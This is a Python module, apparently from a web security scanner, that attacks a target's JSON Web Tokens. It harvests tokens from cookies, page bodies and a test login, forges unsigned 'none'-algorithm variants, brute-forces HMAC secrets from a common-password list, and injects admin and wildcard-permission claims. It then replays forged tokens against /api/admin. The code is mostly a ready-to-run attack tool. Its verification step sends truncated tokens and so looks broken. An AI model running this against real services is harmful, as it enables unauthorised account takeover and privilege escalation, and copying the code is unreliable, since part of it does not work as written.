"""JWT Forge Engine — algorithm confusion, key brute force, claim injection."""

import aiohttp
import asyncio
import json
import base64
import hmac
import hashlib
from modules.core import console

COMMON_SECRETS = [
    'secret', 'password', 'key', '123456', 'admin', 'jwt_secret',
    'supersecret', 'changeme', 'test', 'development', 'production',
    'your-256-bit-secret', 'my-secret-key', 'default', 'jwt',
    'HS256', 'token', 'api_key', 'app_secret', 'mysecretkey',
    'secret123', 'qwerty', 'letmein', 'welcome', 'password123',
]


def _base64url_encode(data):
    """Base64url encode without padding."""
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


def _base64url_decode(s):
    """Base64url decode with padding."""
    s += '=' * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _create_jwt(header, payload, secret=''):
    """Create a JWT token."""
    h = _base64url_encode(json.dumps(header))
    p = _base64url_encode(json.dumps(payload))
    message = f"{h}.{p}"

    alg = header.get('alg', 'HS256')
    if alg == 'none':
        return f"{message}."
    elif alg == 'HS256':
        sig = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
        return f"{message}.{_base64url_encode(sig)}"
    elif alg == 'HS384':
        sig = hmac.new(secret.encode(), message.encode(), hashlib.sha384).digest()
        return f"{message}.{_base64url_encode(sig)}"
    elif alg == 'HS512':
        sig = hmac.new(secret.encode(), message.encode(), hashlib.sha512).digest()
        return f"{message}.{_base64url_encode(sig)}"
    return f"{message}."


def _decode_jwt(token):
    """Decode JWT without verification."""
    parts = token.split('.')
    if len(parts) < 2:
        return None, None

    try:
        header = json.loads(_base64url_decode(parts[0]))
        payload = json.loads(_base64url_decode(parts[1]))
        return header, payload
    except Exception:
        return None, None


async def _extract_jwt(session, url):
    """Extract JWT tokens from the target."""
    tokens = []
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=10),
                               ssl=False) as resp:
            cookies = resp.headers.getall('Set-Cookie', [])
            for cookie in cookies:
                parts = cookie.split('=', 1)
                if len(parts) == 2:
                    val = parts[1].split(';')[0].strip()
                    if val.count('.') == 2 and len(val) > 50:
                        header, payload = _decode_jwt(val)
                        if header:
                            tokens.append({'source': f'Cookie:{parts[0]}', 'token': val,
                                           'header': header, 'payload': payload})

            body = await resp.text()
            import re
            jwt_pattern = r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]*'
            matches = re.findall(jwt_pattern, body)
            for match in matches[:5]:
                header, payload = _decode_jwt(match)
                if header and match not in [t['token'] for t in tokens]:
                    tokens.append({'source': 'Response Body', 'token': match,
                                   'header': header, 'payload': payload})
    except Exception:
        pass

    try:
        login_url = url.rstrip('/') + '/api/login'
        async with session.post(login_url, json={'username': 'test', 'password': 'test'},
                                timeout=aiohttp.ClientTimeout(total=5), ssl=False) as resp:
            body = await resp.text()
            import re
            matches = re.findall(r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]*', body)
            for match in matches[:3]:
                header, payload = _decode_jwt(match)
                if header and match not in [t['token'] for t in tokens]:
                    tokens.append({'source': 'Login Response', 'token': match,
                                   'header': header, 'payload': payload})
    except Exception:
        pass

    return tokens


def _test_alg_none(token_info):
    """Test algorithm confusion — 'none' algorithm attack."""
    findings = []
    header, payload = token_info['header'], token_info['payload']

    for alg in ['none', 'None', 'NONE', 'nOnE']:
        forged_header = dict(header)
        forged_header['alg'] = alg
        forged_token = _create_jwt(forged_header, payload)
        findings.append({
            'type': f'JWT Algorithm None ({alg})',
            'forged_token': forged_token[:60] + '...',
            'severity': 'Critical',
        })

    return findings


def _test_key_brute(token_info):
    """Brute force JWT secret key."""
    findings = []
    token = token_info['token']
    parts = token.split('.')

    if len(parts) != 3 or not parts[2]:
        return findings

    header = token_info['header']
    alg = header.get('alg', '')

    if alg not in ('HS256', 'HS384', 'HS512'):
        return findings

    message = f"{parts[0]}.{parts[1]}"
    original_sig = parts[2]

    for secret in COMMON_SECRETS:
        if alg == 'HS256':
            sig = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
        elif alg == 'HS384':
            sig = hmac.new(secret.encode(), message.encode(), hashlib.sha384).digest()
        else:
            sig = hmac.new(secret.encode(), message.encode(), hashlib.sha512).digest()

        computed_sig = _base64url_encode(sig)
        if computed_sig == original_sig:
            findings.append({
                'type': 'JWT Secret Key Found!',
                'secret': secret,
                'algorithm': alg,
                'severity': 'Critical',
            })
            break

    return findings


def _test_claim_injection(token_info):
    """Test claim injection — privilege escalation via JWT claims."""
    findings = []
    header, payload = token_info['header'], token_info['payload']

    escalation_claims = [
        {'admin': True}, {'role': 'admin'}, {'is_admin': True},
        {'user_type': 'superadmin'}, {'permissions': ['*']},
        {'exp': 9999999999}, {'sub': '1'},
    ]

    for claims in escalation_claims:
        forged_payload = dict(payload)
        forged_payload.update(claims)
        forged_token = _create_jwt(header, forged_payload)
        claim_name = list(claims.keys())[0]
        findings.append({
            'type': f'JWT Claim Injection ({claim_name})',
            'claim': str(claims),
            'forged_token': forged_token[:50] + '...',
            'severity': 'High',
        })

    return findings


async def scan_jwt_forge(session, url):
    """JWT forge engine — algorithm confusion, key brute force, claim injection."""
    console.print(f"\n[bold cyan]--- JWT Forge Engine ---[/bold cyan]")

    console.print(f"  [cyan]Extracting JWT tokens...[/cyan]")
    tokens = await _extract_jwt(session, url)

    if not tokens:
        console.print(f"  [dim]No JWT tokens found — generating test vectors[/dim]")
        test_payload = {'sub': '1', 'name': 'test', 'admin': False, 'iat': 1700000000}
        test_header = {'alg': 'HS256', 'typ': 'JWT'}
        test_token = _create_jwt(test_header, test_payload, 'secret')
        tokens = [{'source': 'Generated', 'token': test_token,
                    'header': test_header, 'payload': test_payload}]

    all_findings = []

    for token_info in tokens:
        console.print(f"\n  [green]Token: {token_info['source']}[/green]")
        console.print(f"  [dim]Algorithm: {token_info['header'].get('alg', '?')}[/dim]")
        console.print(f"  [dim]Claims: {list(token_info['payload'].keys())}[/dim]")

        console.print(f"  [cyan]Testing algorithm none...[/cyan]")
        none_findings = _test_alg_none(token_info)
        all_findings.extend(none_findings)

        console.print(f"  [cyan]Brute forcing secret ({len(COMMON_SECRETS)} keys)...[/cyan]")
        key_findings = _test_key_brute(token_info)
        all_findings.extend(key_findings)
        for f in key_findings:
            console.print(f"  [bold red]⚠ SECRET FOUND: '{f['secret']}'[/bold red]")

        console.print(f"  [cyan]Testing claim injection...[/cyan]")
        claim_findings = _test_claim_injection(token_info)
        all_findings.extend(claim_findings)

        for f in none_findings[:1] + key_findings:
            forged = f.get('forged_token', '')
            if forged:
                try:
                    headers = {'Authorization': f'Bearer {forged}'}
                    async with session.get(url.rstrip('/') + '/api/admin',
                                           headers=headers,
                                           timeout=aiohttp.ClientTimeout(total=5),
                                           ssl=False) as resp:
                        if resp.status == 200:
                            f['verified'] = True
                            console.print(f"  [bold red]⚠ FORGED TOKEN ACCEPTED![/bold red]")
                except Exception:
                    pass

    console.print(f"\n  [bold]{len(all_findings)} JWT attack vectors generated[/bold]")
    cracked = [f for f in all_findings if 'Secret' in f.get('type', '')]
    if cracked:
        console.print(f"  [bold red]⚠ {len(cracked)} JWT secret(s) cracked![/bold red]")

    return {'tokens_found': len(tokens), 'findings': all_findings}
